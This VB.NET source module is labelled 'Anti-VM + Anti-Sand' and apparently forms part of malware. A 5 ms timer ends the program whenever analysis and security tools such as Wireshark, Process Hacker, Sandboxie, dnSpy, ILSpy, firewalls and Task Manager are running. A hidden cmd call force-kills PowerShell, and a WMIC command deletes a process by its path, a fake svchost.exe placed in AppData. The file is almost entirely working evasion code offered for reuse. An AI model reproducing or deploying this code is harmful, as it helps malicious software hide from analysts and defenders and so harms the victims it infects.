Imports System
Imports System.Diagnostics
Imports System.Timers
Imports Microsoft.VisualBasic.CompilerServices
Module MyAntiProcess

    '########################
    '#  Anti-VM + Anti-Sand #
    '#  Humoud Al-Juraid    #
    '#      @HumoudMJ       #
    '# Please Donot remove  #
    '#	    my credit       #
    '########################
    Sub ByKill()
        Try
            Dim cmd As String = "cmd"
            ' كود الغلق من الدوس.. كود متكلف Wmic
            'حصري
            ' الكود خاص بإغلاق اي برنامج من خلال المسار، وليس من خلال الاسم فقط نظرا لتشابه الاسم مع ملفات السيستم
            ' اخذ وقت من البحث والدراسة لمدة 3 ايام والحمد لله بقى تمام
            Dim batc As String = "/c wmic process where ExecutablePath='%HomeDrive%\\Users\\%username%\\AppData\\Roaming\\system32\\svchost.exe' delete"
            Dim P As New Process
            P.StartInfo.FileName = cmd
            P.StartInfo.Arguments = batc
            P.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
            P.Start()
            P.WaitForExit()
            'Threading.Thread.Sleep(1000)
        Catch ex As Exception
            '     MsgBox("ByKill")
        End Try
    End Sub

    Sub Handler()
        'Process Explorer
        '''Dim process As Process
        '''For Each process In Process.GetProcessesByName("procexp64")

        '''    ProjectData.EndApp()
        '''Next

        ' process Explorer X64
        Dim process64 As Process
        'For Each process64 In Process.GetProcessesByName("procexp64")
        '    ' ByKill()
        '    ' MsgBox("ddd")
        '    ProjectData.EndApp()
        'Next
        Dim processCurePorts As Process
        For Each processCurePorts In Process.GetProcessesByName("cports")

            ProjectData.EndApp()
        Next

        'Taskmgr.exe
        Dim processtask As Process
        For Each processtask In Process.GetProcessesByName("Taskmgr")
            'ByKill()
            Shell("cmd.exe /c taskkill /f /IM  Powershell.exe", AppWinStyle.Hide)
            ProjectData.EndApp()
        Next
        'Advanced System Care Monitor
        Dim processMonitor As Process
        For Each processMonitor In Process.GetProcessesByName("Monitor")
            processMonitor.Kill()
            ProjectData.EndApp()
        Next
        Dim process2 As Process
        For Each process2 In Process.GetProcessesByName("SbieCtrl")
            ProjectData.EndApp()
        Next


        Dim process3 As Process
        For Each process3 In Process.GetProcessesByName("SpyTheSpy")
            ProjectData.EndApp()
        Next


        Dim process4 As Process
        For Each process4 In Process.GetProcessesByName("wireshark")
            ProjectData.EndApp()
        Next


        Dim process5 As Process
        For Each process5 In Process.GetProcessesByName("apateDNS")
            ProjectData.EndApp()
        Next


        Dim process6 As Process
        For Each process6 In Process.GetProcessesByName("IPBlocker")
            ProjectData.EndApp()
        Next


        Dim process7 As Process
        For Each process7 In Process.GetProcessesByName("TiGeR-Firewall")
            ProjectData.EndApp()
        Next


        Dim process8 As Process
        For Each process8 In Process.GetProcessesByName("smsniff")
            ProjectData.EndApp()
        Next


        Dim process9 As Process
        For Each process9 In Process.GetProcessesByName("exeinfoPE")
            ProjectData.EndApp()
        Next


        Dim process10 As Process
        For Each process10 In Process.GetProcessesByName("NetSnifferCs")
            ProjectData.EndApp()
        Next


        Dim process11 As Process
        For Each process11 In Process.GetProcessesByName("Sandboxie Control")
            ProjectData.EndApp()
        Next


        Dim process12 As Process
        For Each process12 In Process.GetProcessesByName("processhacker")
            ProjectData.EndApp()
        Next


        Dim process15 As Process
        For Each process15 In Process.GetProcessesByName("dnSpy")
            ProjectData.EndApp()
        Next

        Dim process16 As Process
        For Each process16 In Process.GetProcessesByName("CodeReflect")
            ProjectData.EndApp()
        Next

        Dim process17 As Process
        For Each process17 In Process.GetProcessesByName("Reflector")
            ProjectData.EndApp()
        Next

        Dim process18 As Process
        For Each process18 In Process.GetProcessesByName("ILSpy")
            ProjectData.EndApp()
        Next

        'Dim process19 As Process
        'For Each process19 In Process.GetProcessesByName("VGAuthService")
        '    ProjectData.EndApp()
        'Next


        'Dim process20 As Process
        'For Each process20 In Process.GetProcessesByName("VBoxService")
        '    '  MsgBox("vbox detected")
        '    ProjectData.EndApp()
        'Next
        'Dim procesw32pad As Process
        'For Each procesw32pad In Process.GetProcessesByName("win32pad")
        '    'ByKill()
        '    Shell("cmd.exe /c taskkill /f /IM  Powershell.exe", AppWinStyle.Hide)
        '    ProjectData.EndApp()
        'Next

    End Sub

    Public Sub Start()
        MyAntiProcess.Timer = New Timer(5)
        AddHandler MyAntiProcess.Timer.Elapsed, New ElapsedEventHandler(AddressOf MyAntiProcess.Handler)
        MyAntiProcess.Timer.Enabled = True
    End Sub
    ' Fields
    Private Timer As Timer
    'Private N As Module1 = New Module1
End Module
